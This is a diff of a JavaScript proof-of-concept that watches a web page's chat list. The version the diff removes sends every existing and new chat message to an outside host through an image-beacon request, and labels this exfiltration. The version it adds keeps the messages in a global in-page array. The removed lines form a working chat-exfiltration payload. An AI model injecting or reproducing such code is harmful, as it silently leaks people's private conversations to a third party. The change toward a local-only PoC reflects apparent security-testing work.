@@ -1,42 +1,52 @@
-// poc.js
-;(function() {
-  const EXFIL_ENDPOINT = 'https://44.paresh.ninja/collect';
+// poc_collect_chat.js
+// PoC: Collect chat messages on the same page without an external endpoint
 
-  function exfil(text) {
-    const img = new Image();
-    img.src = EXFIL_ENDPOINT + '?msg=' + encodeURIComponent(text);
-    console.log('📤 exfiltrated:', text);
+;(function() {
+  // Create or reuse a global array to store collected chat entries
+  window.collectedChat = window.collectedChat || [];
+
+  /**
+   * Stores a chat message and timestamp in the global collector.
+   * @param {string} text - The chat message text
+   */
+  function collect(text) {
+    window.collectedChat.push({
+      time: new Date().toISOString(),
+      message: text
+    });
+    console.log('🗄️ collectedChat:', window.collectedChat);
   }
 
-  // auto‐find the chat <ul>
+  // Find the chat-list container (<ul> with <li> items)
   const chatList = Array.from(document.querySelectorAll('ul'))
     .find(ul =>
-      ul.querySelector('li') &&
-      Array.from(ul.querySelectorAll('li')).some(li => li.innerText.trim())
+      Array.from(ul.querySelectorAll('li')).some(li => li.innerText.trim().length > 0)
     );
 
   if (!chatList) {
-    return console.error('❌ chat container not found');
+    console.error('❌ chat container not found');
+    return;
   }
   console.log('✅ hooked chatList:', chatList);
 
-  // watch for new messages
-  new MutationObserver(muts => {
-    muts.forEach(m => {
-      m.addedNodes.forEach(node => {
-        if (node.nodeType === 1) {
-          const txt = node.innerText.trim();
-          if (txt) exfil(txt);
+  // Observe for new messages added to the list
+  const observer = new MutationObserver(mutations => {
+    mutations.forEach(mutation => {
+      mutation.addedNodes.forEach(node => {
+        if (node.nodeType === Node.ELEMENT_NODE) {
+          const text = node.innerText.trim();
+          if (text) collect(text);
         }
       });
     });
-  }).observe(chatList, { childList: true });
+  });
+  observer.observe(chatList, { childList: true });
 
-  // also exfil existing messages
+  // Collect any existing messages on page load
   chatList.querySelectorAll('li').forEach(li => {
-    const txt = li.innerText.trim();
-    if (txt) exfil(txt);
+    const text = li.innerText.trim();
+    if (text) collect(text);
   });
 
-  console.log('🕵️‍♂️ PoC running!');
+  console.log('🏠 PoC collection running! Inspect with `window.collectedChat`.');
 })();
